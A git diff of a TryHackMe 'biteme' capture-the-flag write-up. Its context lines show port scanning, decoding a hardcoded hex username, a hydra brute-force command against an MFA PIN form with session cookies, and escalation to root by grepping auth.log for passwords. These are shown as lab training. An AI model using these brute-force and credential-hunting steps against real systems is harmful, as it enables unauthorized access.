@@ -9,6 +9,7 @@ image: /assets/img/bitemeTHM/biteme.png
 # biteme tryhackme
 # Enumeration
 **port scan** 
+
 *Starting off with scanning ports*
 ```
 nmap -sC -sV -v 10.10.50.109 -oN nmaptop1000.txt
@@ -40,7 +41,6 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 ```
-
 *ports which are open are 22,80*
 
 # port 22 enumeration
@@ -193,6 +193,7 @@ we got the source code*
 - `functions.php`
 - `securimage/securimage.php`
 - `mfa.php`
+
 **Checking functions.phps**
 ```
 <?php   
@@ -213,7 +214,9 @@ define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74');
 
 ## Understand functions.phps
 **Understanding is_valid_user**
+
 *Check function of is_valid_user, see clearly that our <a href="https://www.php.net/manual/en/function.bin2hex.php">function bin2hex</a> used to convert our parameter to hexadecimal and compared to LOGIN_USER in which its value is 6a61736f6e5f746573745f6163636f756e74*
+
 **Decode it** 
 ```
 └─$ php -a
@@ -227,6 +230,7 @@ php >
 *we got jason_test_account as user used to compared*
 
 **Understanding is_valid_pwd**
+
  *our parameter got hashed to md5 and return with substr.*
  *Understand what substr is doing, we can use php interactive shell*
  ```
@@ -304,6 +308,7 @@ crunch: 100% completed generating output
 
 ```
 **Bruteforce**
+
 *Use hydra to bruteforce for pins*
 ```
 hydra -l jason_test_account -P pin.txt 10.10.109.19 http-post-form "/console/mfa.php:code=^PASS^:Incorrect code:H=Cookie: PHPSESSID=ctmklmsqs2q5sg90f81gt2a8qr; user=jason_test_account; pwd=violet" -V
@@ -403,7 +408,9 @@ drwxr-xr-x 2 jason jason 4096 Sep 24  2021 .ssh
 
 ## ROOT PRIVILEDGE
 *I will give short brief but you can try tool like linpeas*
+
 **check groups**
+
 ```
 jason@biteme:~$ id
 uid=1000(jason) gid=1000(jason) groups=1000(jason),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
@@ -414,6 +421,7 @@ try sudo su but remember we dont have password.
 since we are in group of adm, it mean that we can read logs
 
 **Checking auth.log**
+
 *Reading auth.log since we are in a group of adm*
 ```
 jason@biteme:/var/log$ cat /var/log/auth.log|grep -a  pass                                                                                                                                                                                    
@@ -563,4 +571,4 @@ We are root
 
 Greeting from <a href="https://twitter.com/blackninja233">blackninja23</a>
 
-<img src="/assets/img/bitemeTHM/throw.gif" alt="" width="500" height="600">
+<img src="/assets/img/bitemeTHM/throw.gif" alt="">
